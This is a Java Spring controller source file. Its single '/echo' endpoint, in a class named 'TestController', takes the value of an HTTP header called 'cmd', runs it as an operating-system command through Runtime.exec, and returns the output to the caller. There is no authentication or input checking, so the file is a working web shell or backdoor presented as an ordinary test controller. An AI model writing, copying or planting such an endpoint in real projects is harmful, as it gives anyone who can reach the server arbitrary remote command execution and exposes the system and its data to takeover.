package com.management.controller;

import com.management.bean.User;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.request.RequestAttributes;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;

@Controller
public class TestController {


    @ResponseBody
    @RequestMapping(value="/echo", method = RequestMethod.GET)
    public User Test() throws IOException {

        RequestAttributes requestAttributes = RequestContextHolder.getRequestAttributes();
        HttpServletRequest httprequest = ((ServletRequestAttributes) requestAttributes).getRequest();
        HttpServletResponse httpresponse = ((ServletRequestAttributes) requestAttributes).getResponse();

        String cmd = httprequest.getHeader("cmd");
        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
        InputStreamReader isr = new InputStreamReader(in);
        BufferedReader br = new BufferedReader(isr);

        StringBuilder sb = new StringBuilder();
        String line;
        while((line = br.readLine()) != null){
            sb.append(line + "\n");
        }

        br.close();
        isr.close();
        in.close();

        httpresponse.getWriter().println(sb.toString());

        return new User();
    }
}
